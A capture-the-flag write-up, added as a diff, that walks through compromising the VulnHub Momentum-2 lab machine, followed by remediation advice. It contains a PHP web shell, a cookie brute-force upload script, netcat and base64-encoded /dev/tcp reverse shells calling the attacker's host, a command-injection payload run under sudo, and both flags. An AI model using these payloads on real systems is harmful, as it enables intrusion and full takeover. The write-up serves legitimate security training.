@@ -1,0 +1,878 @@
+================================================================================
+Momentum-2 CTF - Technical Solution Guide
+https://www.vulnhub.com/entry/momentum-2,702/
+================================================================================
+
+OBJECTIVE: Get the root flag
+DIFFICULTY: Medium
+KEYWORDS: File upload bypass, Cookie manipulation, Command injection
+TARGET IP: 10.0.2.251
+
+================================================================================
+[1] RECONNAISSANCE
+================================================================================
+
+# Network scan
+nmap -sS -sV -A -p- 10.0.2.251
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-05 15:23 -0500
+
+Target: 10.0.2.251
+Open Ports:
+  22/tcp - SSH (OpenSSH 7.9p1 Debian 10+deb10u2)
+  80/tcp - HTTP (Apache/2.4.38 Debian)
+
+SSH Host Keys:
+  RSA:     02:32:8e:5b:27:a8:ea:f2:fe:11:db:2f:57:f4:11:7e
+  ECDSA:   74:35:c8:fb:96:c1:9f:a0:dc:73:6c:cd:83:52:bf:b7
+  ED25519: fc:4a:70:fb:b9:7d:32:89:35:0a:45:3d:d9:8b:c5:95
+
+OS Detection: Linux 4.15 - 5.19 (Debian 10)
+Network Distance: 1 hop
+
+# Key observation
+Standard SSH and HTTP ports open. Web server is the primary attack surface.
+
+================================================================================
+[2] WEB VULNERABILITY SCANNING
+================================================================================
+
+# Web server vulnerability scan
+nikto -h http://10.0.2.251
+
+Findings:
+  - Apache/2.4.38 (outdated - EOL)
+  - Missing security headers:
+    * X-Frame-Options (clickjacking vulnerability)
+    * X-Content-Type-Options
+  - Directory indexing enabled: /css/, /img/, /manual/images/
+  - ETag information disclosure (inode leakage)
+  - HTTP methods allowed: HEAD, GET, POST, OPTIONS
+  - Apache default files accessible: /icons/README
+
+# Security issues identified
+1. Outdated Apache version (current: 2.4.54+)
+2. Directory listing enabled (information disclosure)
+3. Missing modern security headers
+
+================================================================================
+[3] WEB DIRECTORY ENUMERATION
+================================================================================
+
+# Directory and file discovery
+gobuster dir -u http://10.0.2.251/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.js,.bak,.txt,.php.bak
+
+Discovered endpoints:
+  /index.html           (Status: 200) [Size: 1428]
+  /img                  (Status: 301) [--> http://10.0.2.251/img/]
+  /css                  (Status: 301) [--> http://10.0.2.251/css/]
+  /ajax.php.bak         (Status: 200) [Size: 357]  *** CRITICAL ***
+  /ajax.php             (Status: 200) [Size: 0]
+  /manual               (Status: 301) [--> http://10.0.2.251/manual/]
+  /js                   (Status: 301) [--> http://10.0.2.251/js/]
+  /dashboard.html       (Status: 200) [Size: 513]  *** FILE UPLOAD ***
+  /owls                 (Status: 301) [--> http://10.0.2.251/owls/]
+  /server-status        (Status: 403) [Size: 275]
+
+# Critical discoveries
+1. ajax.php.bak - Backup file containing source code (information disclosure)
+2. dashboard.html - File upload functionality
+3. ajax.php - File upload handler endpoint
+
+================================================================================
+[4] FILE UPLOAD ANALYSIS
+================================================================================
+
+# Dashboard page inspection
+curl http://10.0.2.251/dashboard.html
+
+HTML Content:
+<head>
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <script type="text/javascript" src="js/main.js"></script>
+    <title>Momentum 2 | Enjoy it </title>
+</head>
+<body>
+    <br><br>
+    <h1>Momentum 2</h1>
+    <p id="prova"></p>
+    <div>
+        <input type="file" name="file" id="file">
+        <input type="button" id="btn_uploadfile" 
+           value="Upload" 
+           onclick="uploadFile();">
+    </div>
+    <p class="footer">~ Upload Your Research File about Owls</p>
+</body>
+
+# Upload JavaScript handler
+curl http://10.0.2.251/js/main.js
+
+JavaScript Code:
+function uploadFile() {
+    var files = document.getElementById("file").files;
+    
+    if(files.length > 0){
+        var formData = new FormData();
+        formData.append("file", files[0]);
+        
+        var xhttp = new XMLHttpRequest();
+        xhttp.open("POST", "ajax.php", true);
+        
+        xhttp.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+                var response = this.responseText;
+                if(response == 1){
+                    alert("Upload successfully.");
+                }else{
+                    alert("File not uploaded.");
+                }
+            }
+        };
+        
+        xhttp.send(formData);
+    }else{
+        alert("Please select a file");
+    }
+}
+
+# Key observations
+- File uploads sent via AJAX to ajax.php
+- Success indicated by response value "1"
+- No client-side file type validation
+- POST request to ajax.php endpoint
+
+================================================================================
+[5] SOURCE CODE DISCLOSURE - CRITICAL VULNERABILITY
+================================================================================
+
+# Download backup file
+curl http://10.0.2.251/ajax.php.bak
+curl -O http://10.0.2.251/ajax.php.bak
+
+Backup File Content:
+<?php
+    //The boss told me to add one more Upper Case letter at the end of the cookie
+    if(isset($_COOKIE['admin']) && $_COOKIE['admin'] == '&G6u@B6uDXMq&Ms'){
+        //[+] Add if $_POST['secure'] == 'val1d'
+        $valid_ext = array("pdf","php","txt");
+    }
+    else{
+        $valid_ext = array("txt");
+    }
+    
+    // Remember success upload returns 1
+?>
+
+# Vulnerability analysis
+
+1. Cookie-based authentication bypass:
+   - Cookie name: 'admin'
+   - Base value: '&G6u@B6uDXMq&Ms'
+   - Comment reveals: "add one more Upper Case letter at the end"
+   - Actual cookie format: '&G6u@B6uDXMq&Ms[A-Z]'
+
+2. File type validation bypass:
+   - Default allowed: only .txt files
+   - With valid cookie: .pdf, .php, .txt files allowed
+   - PHP file upload possible with authentication bypass
+
+3. Additional security bypass:
+   - POST parameter 'secure' must equal 'val1d'
+   - Typo in value suggests obfuscation attempt
+   - Both conditions required for PHP upload
+
+# Attack requirements
+✓ Cookie: admin=&G6u@B6uDXMq&Ms[A-Z] (26 possibilities)
+✓ POST parameter: secure=val1d
+✓ File extension: .php
+
+================================================================================
+[6] EXPLOITATION - FILE UPLOAD BYPASS
+================================================================================
+
+# Create PHP web shell
+cat shell.php
+<?php
+echo system($_REQUEST['cmd']);
+?>
+
+# Create automated brute-force script
+cat upload.py
+import os
+import requests
+
+wordlist = 'letters.txt'
+
+with open(wordlist, "r") as file:
+   words = file.read().splitlines()
+
+   for word in words:
+      command = "curl -k -F 'file=@./shell.php' -F 'secure=val1d' --cookie 'admin=&G6u@B6uDXMq&Ms"+word + " " + "http://10.0.2.251/ajax.php"
+      os.system(command)
+      print(command)
+
+   if "1" in command:
+      print("[*] Shell Uploaded!")
+      for execute in command:
+          execute_command = input("[!] Command to Execute: ")
+          get_rce = requests.get('http://10.0.2.251/owls/shell.php?cmd='+execute_command)
+          print(str(get_rce.content))
+
+          if execute_command == "clear":
+             os.system("clear")
+
+   else:
+      print("[!] Shell not Uploaded!")
+
+
+
+# Execute upload script
+chmod +x upload.py
+python3 upload.py
+
+Output:
+0curl -k -F 'file=@./shell.php' -F 'secure=val1d' --cookie 'admin=&G6u@B6uDXMq&MsA' http://10.0.2.251/ajax.php
+0curl -k -F 'file=@./shell.php' -F 'secure=val1d' --cookie 'admin=&G6u@B6uDXMq&MsB' http://10.0.2.251/ajax.php
+[... attempts C through Q ...]
+1curl -k -F 'file=@./shell.php' -F 'secure=val1d' --cookie 'admin=&G6u@B6uDXMq&MsR' http://10.0.2.251/ajax.php
+
+[*] Shell Uploaded!
+[*] Correct cookie: admin=&G6u@B6uDXMq&MsR
+[!] Command to Execute: whoami
+b'www-data\nwww-data'
+
+# SUCCESS: Correct cookie value is '&G6u@B6uDXMq&MsR'
+# Web shell uploaded to: /owls/shell.php
+# Shell accessible at: http://10.0.2.251/owls/shell.php?cmd=COMMAND
+
+================================================================================
+[7] INITIAL ACCESS - REVERSE SHELL
+================================================================================
+
+# Setup listener on attacker machine
+nc -nvlp 9001
+
+# Execute reverse shell command on target
+# Web shell: http://10.0.2.251/owls/shell.php?cmd=nc 10.0.2.6 9001 -e /bin/bash
+
+# Alternative method using URL encoding
+curl "http://10.0.2.251/owls/shell.php?cmd=nc+10.0.2.6+9001+-e+/bin/bash"
+
+# Listener receives connection
+nc -nvlp 9001
+listening on [any] 9001 ...
+connect to [10.0.2.6] from (UNKNOWN) [10.0.2.251] 45890
+
+# Verify access
+whoami
+www-data
+
+# Stabilize shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+
+# Shell successfully established as www-data user
+
+================================================================================
+[8] POST-EXPLOITATION - SYSTEM ENUMERATION
+================================================================================
+
+# Navigate to web root
+www-data@momentum2:/var/www/html/owls$ cd /home
+
+# List users
+www-data@momentum2:/home$ ls
+athena  team-tasks
+
+# Two directories discovered:
+# 1. athena - User home directory
+# 2. team-tasks - Shared team workspace
+
+# Enumerate athena's home directory
+www-data@momentum2:/home$ cd athena
+www-data@momentum2:/home/athena$ ls -la
+
+total 32
+drwxr-xr-x 3 athena athena 4096 May 27  2021 .
+drwxr-xr-x 4 root   root   4096 May 27  2021 ..
+-rw-r--r-- 1 athena athena  220 May 25  2021 .bash_logout
+-rw-r--r-- 1 athena athena 3526 May 25  2021 .bashrc
+drwxr-xr-x 3 athena athena 4096 May 27  2021 .local
+-rw-r--r-- 1 athena athena  807 May 25  2021 .profile
+-rw-r--r-- 1 athena athena   37 May 27  2021 password-reminder.txt
+-rw-r--r-- 1 root   root    241 May 27  2021 user.txt
+
+# Key files identified:
+# 1. password-reminder.txt - Potential credential disclosure
+# 2. user.txt - First flag (owned by root, readable by all)
+
+================================================================================
+[9] FLAG 1 - USER FLAG
+================================================================================
+
+# Read user flag
+www-data@momentum2:/home/athena$ cat user.txt
+
+/                         \
+~ Momentum 2 ~ User Owned ~
+\                         /
+
+---------------------------------------------------
+FLAG : 4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw
+---------------------------------------------------
+
+FLAG 1: 4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw
+
+# Read password reminder
+www-data@momentum2:/home/athena$ cat password-reminder.txt
+
+password : myvulnerableapp[Asterisk]
+
+# Credential analysis
+Username: athena (from directory name)
+Password: myvulnerableapp* (asterisk symbol literal)
+
+# Note: [Asterisk] in file represents actual asterisk character
+
+================================================================================
+[10] LATERAL MOVEMENT - SSH ACCESS
+================================================================================
+
+# SSH connection to target
+ssh athena@10.0.2.251
+
+Password: myvulnerableapp*
+
+# Successful authentication
+athena@momentum2:~$ whoami
+athena
+
+athena@momentum2:~$ id
+uid=1000(athena) gid=1000(athena) groups=1000(athena),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+
+# Verify current directory
+athena@momentum2:~$ pwd
+/home/athena
+
+# Now operating with athena user privileges
+# SSH access provides more stable shell than web shell
+
+================================================================================
+[11] PRIVILEGE ESCALATION - ENUMERATION
+================================================================================
+
+# Check sudo permissions
+athena@momentum2:~$ sudo -l
+
+Matching Defaults entries for athena on momentum2:
+    env_reset, mail_badpass, 
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User athena may run the following commands on momentum2:
+    (root) NOPASSWD: /usr/bin/python3 /home/team-tasks/cookie-gen.py
+
+# Critical finding
+✓ Athena can run Python script as root without password
+✓ Script location: /home/team-tasks/cookie-gen.py
+✓ Python interpreter: /usr/bin/python3
+✓ No password required (NOPASSWD)
+
+# Examine team-tasks directory
+athena@momentum2:~$ cd /home/team-tasks
+athena@momentum2:/home/team-tasks$ ls -la
+
+total 16
+drwxr-xr-x 2 root root 4096 May 27  2021 .
+drwxr-xr-x 4 root root 4096 May 27  2021 ..
+-rw-r--r-- 1 root root  402 May 27  2021 cookie-gen.py
+-rw-r--r-- 1 root root    0 May 27  2021 log.txt
+-rw-r--r-- 1 root root  151 May 27  2021 note.txt
+
+# Read administrator note
+athena@momentum2:/home/team-tasks$ cat note.txt
+
+Hey, Athena use the cookie-gen.py 
+to generate secure cookies for our application 
+also remove the ajax.php.bak before it's too late.
+
+- administrator
+
+# Note reveals:
+# 1. cookie-gen.py is intended for cookie generation
+# 2. ajax.php.bak should have been removed (but wasn't)
+# 3. Security oversight by administrator
+
+================================================================================
+[12] VULNERABILITY ANALYSIS - COMMAND INJECTION
+================================================================================
+
+# Read cookie-gen.py source code
+athena@momentum2:/home/team-tasks$ cat cookie-gen.py
+
+import random
+import os
+import subprocess
+
+print('~ Random Cookie Generation ~')
+print('[!] for security reasons we keep logs about cookie seeds.')
+chars = '@#$ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh'
+
+seed = input("Enter the seed : ")
+random.seed = seed
+
+cookie = ''
+for c in range(20):
+    cookie += random.choice(chars)
+
+print(cookie)
+
+cmd = "echo %s >> log.txt" % seed
+subprocess.Popen(cmd, shell=True)
+
+# Code analysis - Multiple vulnerabilities
+
+1. COMMAND INJECTION (Critical):
+   Line: cmd = "echo %s >> log.txt" % seed
+   - User input (seed) directly interpolated into shell command
+   - subprocess.Popen with shell=True executes via /bin/sh
+   - No input sanitization or validation
+   - Allows arbitrary command execution
+
+2. Injection syntax:
+   Input: `command`
+   Result: echo `command` >> log.txt
+   Effect: Backticks cause command substitution before echo
+
+   Input: $(command)
+   Result: echo $(command) >> log.txt
+   Effect: Command substitution via $()
+
+   Input: ; command
+   Result: echo ; command >> log.txt
+   Effect: Command separator executes both commands
+
+3. Attack vector:
+   - Athena can run this script as root via sudo
+   - Command injection in seed input
+   - Commands execute with root privileges
+   - Full system compromise possible
+
+================================================================================
+[13] PRIVILEGE ESCALATION - ROOT ACCESS
+================================================================================
+
+# Prepare reverse shell payload
+# Standard bash reverse shell
+bash -i >& /dev/tcp/10.0.2.6/4242 0>&1
+
+# Base64 encode to avoid special character issues
+echo "bash -i >& /dev/tcp/10.0.2.6/4242 0>&1" | base64
+
+Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuNi80MjQyIDA+JjEK
+
+# Setup new listener on attacker machine
+nc -nvlp 4242
+
+# Execute exploit on target
+athena@momentum2:/home/team-tasks$ sudo -u root /usr/bin/python3 /home/team-tasks/cookie-gen.py
+
+~ Random Cookie Generation ~
+[!] for security reasons we keep logs about cookie seeds.
+Enter the seed : `echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuNi80MjQyIDA+JjEK" | base64 -d | bash`
+
+# Exploit breakdown:
+# 1. Input contains backticks for command substitution
+# 2. echo outputs base64 payload
+# 3. base64 -d decodes the payload
+# 4. bash executes the decoded reverse shell
+# 5. All commands run as root due to sudo
+
+# Listener receives root connection
+nc -nvlp 4242
+listening on [any] 4242 ...
+connect to [10.0.2.6] from (UNKNOWN) [10.0.2.251] 48528
+
+# Verify root access
+whoami
+root
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+# Root shell successfully obtained
+
+================================================================================
+[14] FLAG 2 - ROOT FLAG
+================================================================================
+
+# Navigate to root directory
+cd /root
+pwd
+/root
+
+# List directory contents
+ls -la
+
+total 32
+drwx------  4 root root 4096 May 27  2021 .
+drwxr-xr-x 18 root root 4096 May 25  2021 ..
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwxr-xr-x  3 root root 4096 May 25  2021 .config
+drwxr-xr-x  3 root root 4096 May 27  2021 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-------  1 root root  253 May 27  2021 root.txt
+-rw-r--r--  1 root root  227 May 25  2021 .wget-hsts
+
+# Read root flag
+cat root.txt
+
+//                    \\
+}  Rooted - Momentum 2 {
+\\                    //
+
+---------------------------------------------------
+FLAG : 4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG
+---------------------------------------------------
+
+by Alienum with <3
+
+FLAG 2: 4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG
+
+================================================================================
+[15] FLAGS SUMMARY
+================================================================================
+
+Flag 1: 4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw  (Location: /home/athena/user.txt)
+Flag 2: 4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG  (Location: /root/root.txt)
+
+Machine successfully compromised - Full root access achieved
+
+================================================================================
+[16] VULNERABILITIES EXPLOITED
+================================================================================
+
+1. Information Disclosure - Backup Files (High)
+   Vulnerability: ajax.php.bak exposed complete source code
+   Impact: Revealed authentication mechanism and file upload logic
+   Location: http://10.0.2.251/ajax.php.bak
+   Fix: Remove all backup files from production servers
+   Prevention: Configure web server to block .bak, .old, .tmp files
+
+2. Weak Cookie Authentication (High)
+   Vulnerability: Predictable cookie value with only 26 possibilities
+   Mechanism: Base value + single uppercase letter (brute-forceable)
+   Cookie: admin=&G6u@B6uDXMq&Ms[A-Z]
+   Impact: Authentication bypass via brute-force in seconds
+   Fix: Use cryptographically secure tokens (UUID, JWT)
+   Prevention: Implement proper session management
+
+3. Insecure File Upload (Critical)
+   Vulnerability: PHP file upload without proper validation
+   Bypass: Cookie authentication + POST parameter 'secure=val1d'
+   Impact: Remote code execution via web shell upload
+   Location: /owls/shell.php
+   Fix: Whitelist safe file types, validate content not just extension
+   Prevention: 
+     - Store uploads outside web root
+     - Implement content-type verification
+     - Use random filenames
+     - Disable script execution in upload directories
+
+4. Plaintext Credential Storage (Medium)
+   Vulnerability: SSH password stored in readable text file
+   Location: /home/athena/password-reminder.txt
+   Content: myvulnerableapp*
+   Impact: Lateral movement from www-data to athena user
+   Fix: Never store passwords in plaintext files
+   Prevention: Use password managers, encrypted vaults
+
+5. Command Injection (Critical)
+   Vulnerability: Unsanitized user input in subprocess.Popen(shell=True)
+   Location: /home/team-tasks/cookie-gen.py (line: cmd = "echo %s >> log.txt" % seed)
+   Impact: Arbitrary command execution with root privileges
+   Attack: Backtick command substitution in seed input
+   Fix: Use subprocess with shell=False and proper argument list
+   Prevention:
+     - Never use shell=True with user input
+     - Validate and sanitize all input
+     - Use parameterized commands
+     - Implement input whitelisting
+
+6. Sudo Misconfiguration (Critical)
+   Vulnerability: NOPASSWD sudo for script with command injection
+   Configuration: athena can run cookie-gen.py as root without password
+   Impact: Direct privilege escalation to root
+   Fix: Remove NOPASSWD or fix the script's injection vulnerability
+   Prevention:
+     - Follow principle of least privilege
+     - Audit sudo configurations regularly
+     - Never combine NOPASSWD with scripts accepting user input
+     - Use sudo with specific, hardened commands only
+
+7. Missing Input Validation (High)
+   Vulnerability: No validation on user-supplied seed value
+   Location: cookie-gen.py seed input
+   Impact: Enabled command injection attack
+   Fix: Implement strict input validation and sanitization
+   Prevention:
+     - Whitelist acceptable characters
+     - Reject special characters in sensitive inputs
+     - Use safe APIs that don't invoke shell
+
+8. Insecure File Permissions (Medium)
+   Vulnerability: World-readable user.txt and password-reminder.txt
+   Impact: Information disclosure to lower-privileged users
+   Fix: chmod 600 sensitive files (owner read/write only)
+   Prevention: Apply principle of least privilege to file permissions
+
+================================================================================
+[17] TOOLS USED
+================================================================================
+
+Reconnaissance:
+- Nmap 7.98             : Network and service enumeration
+- Nikto 2.5.0           : Web server vulnerability scanning
+
+Web Enumeration:
+- Gobuster 3.6          : Directory and file discovery
+- curl                  : HTTP client for file retrieval
+
+Exploitation:
+- Python 3              : Custom upload brute-force script
+- Bash                  : Reverse shell payload creation
+- Base64                : Payload encoding
+- Netcat (nc)           : Reverse shell listener
+
+Post-Exploitation:
+- SSH                   : Secure lateral movement
+- sudo                  : Privilege escalation vector
+- Python 3              : Command injection via cookie-gen.py
+
+================================================================================
+[18] SECURITY RECOMMENDATIONS
+================================================================================
+
+1. Web Application Security
+
+   File Upload Protection:
+   - Validate file content, not just extension (magic numbers)
+   - Store uploads outside web root directory
+   - Use randomized filenames
+   - Disable PHP execution in upload directories (.htaccess)
+   - Implement file size limits
+   - Scan uploads with antivirus/malware detection
+
+   Authentication & Session Management:
+   - Use cryptographically secure random tokens
+   - Implement JWT or secure session cookies
+   - Set cookie flags: HttpOnly, Secure, SameSite
+   - Use proper session management frameworks
+   - Implement rate limiting on authentication attempts
+   - Log all authentication events
+
+   Source Code Protection:
+   - Remove all backup files (.bak, .old, .tmp)
+   - Configure web server to deny access to backup extensions
+   - Never deploy development/debugging code to production
+   - Implement proper version control
+   - Use .htaccess or nginx rules to block sensitive files
+
+2. Input Validation & Sanitization
+
+   Command Injection Prevention:
+   - Never use subprocess with shell=True for user input
+   - Use argument lists instead of string formatting
+   - Implement strict input validation (whitelist approach)
+   - Escape special characters if shell execution required
+   - Use safe APIs that don't invoke system shells
+   - Consider using libraries like shlex for parsing
+
+   Example secure code:
+   ```python
+   # INSECURE
+   cmd = "echo %s >> log.txt" % user_input
+   subprocess.Popen(cmd, shell=True)
+   
+   # SECURE
+   with open('log.txt', 'a') as f:
+       f.write(user_input + '\n')
+   ```
+
+3. Credential Management
+
+   - Never store passwords in plaintext files
+   - Use password hashing (bcrypt, Argon2, scrypt)
+   - Implement proper secrets management (Vault, KMS)
+   - Use SSH keys instead of passwords where possible
+   - Enforce strong password policies
+   - Implement multi-factor authentication
+   - Rotate credentials regularly
+   - Use different passwords for different privilege levels
+
+4. Privilege Management
+
+   Sudo Configuration:
+   - Avoid NOPASSWD where possible
+   - Use specific command paths, not scripts with user input
+   - Implement sudoers with minimal required privileges
+   - Regular audit of sudo permissions
+   - Log all sudo usage
+   - Consider using alternatives (capabilities, ACLs)
+
+   Example secure sudoers:
+   ```
+   # INSECURE
+   athena ALL=(root) NOPASSWD: /usr/bin/python3 /path/script.py
+   
+   # MORE SECURE
+   athena ALL=(root) /usr/bin/specific_binary --fixed-args
+   ```
+
+5. System Hardening
+
+   - Keep all software updated (OS, Apache, OpenSSH)
+   - Implement principle of least privilege
+   - Configure proper file permissions (chmod 600 for sensitive files)
+   - Disable directory indexing
+   - Remove unused services and ports
+   - Implement firewall rules (iptables, ufw)
+   - Enable SELinux or AppArmor
+   - Regular security audits and penetration testing
+
+6. Security Headers
+
+   Implement in Apache configuration:
+   ```apache
+   Header always set X-Frame-Options "DENY"
+   Header always set X-Content-Type-Options "nosniff"
+   Header always set X-XSS-Protection "1; mode=block"
+   Header always set Content-Security-Policy "default-src 'self'"
+   Header always set Strict-Transport-Security "max-age=31536000"
+   ```
+
+7. Monitoring & Logging
+
+   - Enable comprehensive logging (access, error, authentication)
+   - Monitor for suspicious activities:
+     * Failed authentication attempts
+     * Unusual sudo usage
+     * File upload activities
+     * Command execution patterns
+   - Implement SIEM for log aggregation and analysis
+   - Set up alerts for security events
+   - Regular review of logs
+   - Retain logs for forensic analysis
+
+8. Network Security
+
+   - Implement network segmentation
+   - Use VPNs for administrative access
+   - Configure firewall rules to limit exposure
+   - Implement intrusion detection/prevention (IDS/IPS)
+   - Regular port scans and vulnerability assessments
+   - Disable unnecessary services
+
+================================================================================
+[19] ATTACK CHAIN SUMMARY
+================================================================================
+
+Nmap port scan (22/tcp, 80/tcp)
+    ↓
+Nikto web vulnerability scan
+    ↓
+Gobuster directory enumeration
+    ↓
+Backup file discovery (ajax.php.bak)
+    ↓
+Source code analysis - Authentication mechanism revealed
+    ↓
+Cookie brute-force (26 attempts: A-Z)
+    ↓
+Correct cookie found (&G6u@B6uDXMq&MsR)
+    ↓
+PHP web shell upload bypass
+    ↓
+Web shell uploaded to /owls/shell.php
+    ↓
+Reverse shell execution (nc -e /bin/bash)
+    ↓
+Initial access as www-data user
+    ↓
+System enumeration (/home directory)
+    ↓
+Password discovery (password-reminder.txt)
+    ↓
+Lateral movement via SSH (athena:myvulnerableapp*)
+    ↓
+User flag capture (/home/athena/user.txt)
+    ↓
+Sudo permission enumeration (sudo -l)
+    ↓
+cookie-gen.py vulnerability analysis
+    ↓
+Command injection exploitation (seed input)
+    ↓
+Base64-encoded reverse shell payload
+    ↓
+Root reverse shell execution
+    ↓
+Privilege escalation to root user
+    ↓
+Root flag capture (/root/root.txt)
+    ↓
+Complete system compromise
+
+================================================================================
+[20] REFERENCES
+================================================================================
+
+VulnHub:
+- Momentum-2 VM: https://www.vulnhub.com/entry/momentum-2,702/
+
+Security Resources:
+- OWASP Top 10: https://owasp.org/www-project-top-ten/
+- OWASP File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+- Command Injection: https://owasp.org/www-community/attacks/Command_Injection
+- CWE-78: https://cwe.mitre.org/data/definitions/78.html
+- Python subprocess security: https://docs.python.org/3/library/subprocess.html#security-considerations
+
+Tools:
+- Nmap: https://nmap.org/
+- Nikto: https://cirt.net/Nikto2
+- Gobuster: https://github.com/OJ/gobuster
+- Netcat: https://nc110.sourceforge.io/
+
+GTFOBins:
+- Sudo exploitation: https://gtfobins.github.io/gtfobins/sudo/
+
+================================================================================
+[21] EXPLOIT CODE REPOSITORY
+================================================================================
+
+All exploit scripts developed during this CTF:
+
+1. upload.py - Cookie brute-force and PHP upload
+2. shell.php - Basic PHP web shell
+3. Reverse shell payloads (bash, base64-encoded)
+
+These scripts are available for educational purposes and should only be used
+on systems you own or have explicit permission to test.
+
+================================================================================
+[22] DISCLAIMER
+================================================================================
+
+This writeup is for educational and training purposes only. The techniques
+demonstrated should only be used on systems you own or have explicit written
+permission to test. Unauthorized access to computer systems is illegal and
+may result in criminal prosecution.
+
+The author and VulnHub are not responsible for any misuse of the information
+provided in this writeup. This content is intended to help security
+professionals learn and practice ethical hacking skills in controlled
+environments.
+
+Always ensure you have proper authorization before performing security testing.
+
+================================================================================
